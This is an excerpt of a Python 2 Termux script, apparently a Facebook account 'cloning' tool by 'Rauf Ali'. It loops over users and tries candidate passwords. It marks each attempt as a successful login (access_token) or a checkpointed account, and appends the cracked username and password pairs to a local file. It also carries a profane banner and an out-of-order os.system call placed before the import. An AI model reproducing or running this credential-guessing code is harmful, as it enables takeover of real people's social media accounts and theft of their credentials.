...
__author__ = 'Rauf Ali'
__copyright = 'All rights reserved . Copyright  Rauf'
os.system('termux-setup-storage')
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests
logo2 = '\n\x1b[1;92m nd8888b.  .d8b.  db    db d88888b \n88  `8D d8' `8b 88    88 88'     \n88oobY' 88ooo88 88    88 88ooo   \n88`8b   88~~~88 88    88 88~~~   \n88 `88. 88   88 88b  d88 88      \n88   YD YP   YP ~Y8888P' YP      \n'
...
logo3 = '\n\x1b[1;92m nd8888b.  .d8b.  db    db d88888b \n88  `8D d8' `8b 88    88 88'     \n88oobY' 88ooo88 88    88 88ooo   \n88`8b   88~~~88 88    88 88~~~   \n88 `88. 88   88 88b  d88 88      \n88   YD YP   YP ~Y8888P' YP      \n                                        \n\x1b[0;35m \n      \x1b[0;33\n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  Tool Owner Rauf Ali\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Rauf Jutt  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m Teri Maa ki () \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mwww.facebook.com/Raufonfire\n\x1b[1;91m-----------------------------------------------'
...
def reg():
    ...
    if to in r:
        ...
        os.system('am start https://www.facebook.com/Raufonfire?text=Please%20Give%20Me%20Api%20Key:%20')
        reg()
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mR4UF-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('save/RAUF.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mR4UF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mR4UF-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/RAUF.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mR4UF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/RAUF.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mR4UF-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/RAUF.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mR4UF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/RAUF.txt', 'a')
    ...
    print '\n    \n    \n    \n    \n\n\x1b[1;92mThanks For Using Rauf_Tool\n\x1b[1;94github\x1b[1;97mhttps://github.com/Darkrulex'
